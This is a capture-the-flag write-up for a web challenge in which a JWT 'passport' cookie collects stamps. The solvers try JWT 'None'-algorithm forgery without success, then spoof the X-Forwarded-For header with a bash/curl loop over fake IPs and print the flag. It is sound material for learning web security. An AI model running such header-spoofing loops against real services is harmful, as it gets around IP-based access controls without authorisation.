Web: Hacking around the world
-----------------------------

Challenge description:

```
Everyne likes to travel, even cookies. Sure sux how expesive plane tickets are though. maybe there is another way.

It looks like its behind a bad proxy ...

challenges.openctf.cat:9027
```

The challenge description hints at an issue with a proxy server. When connecting to the server it sets a `passport` cookie.

```
< HTTP/1.1 303 See Other
< Content-Type: text/memes
< Location: https://www.youtube.com/watch?v=yca6UsllwYs
< Set-Cookie: passport=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1NjY2NDkxODksInBhc3Nwb3J0IjpbXX0.TDIdrmAgIdugAEkZBTx2wKFzeHJTwq90t2P4SwM5oXQ; Expires=Sat, 24 Aug 2019 12:19:49 GMT
< Date: Sat, 24 Aug 2019 12:12:39 GMT
< Content-Length: 0
```

The cookie is a JSON web token and decodes to `{"exp":1566649189,"passport":[]}`. We initially thought there was a problem with the cookie. Either the "bad proxy" might cache cookies of other users, or we might be able to create our own cookie and sign it with a "None" cipher. None of this worked.

Given the proxy hint we guessed to send it proxy related HTTP headers such as `Via`, `Forwaded` and `X-Forwarded-For`. The `X-Forwarded-For` header gave an error message `Try ipv4`.

When given it an IPv4 address it replied:

```
> X-Forwarded-For: 1.2.3.4:80

< You have 1/10 stamps on your passport.
< 0. US - Dallas
```

From here we just kept sending it requests with different IPs as the X-Forwarded-For headers. "Sometimes" the IP gave us a new stamp on the passport. We never figured out what IPs were valid or not, because a quick for loop gave us the flag

```bash
$ for i in `seq 1 254`; do curl -c cookies.txt -b cookies.txt -i -s -k  -X $'GET'     -H $'Host: challenges.openctf.cat:9027' -H "X-Forwarded-For: $i.1.1.3:80"     $'http://challenges.openctf.cat:9027/'; done

flag{wh4t_4_t4ng313d_w3b_w3_w34v3}
```
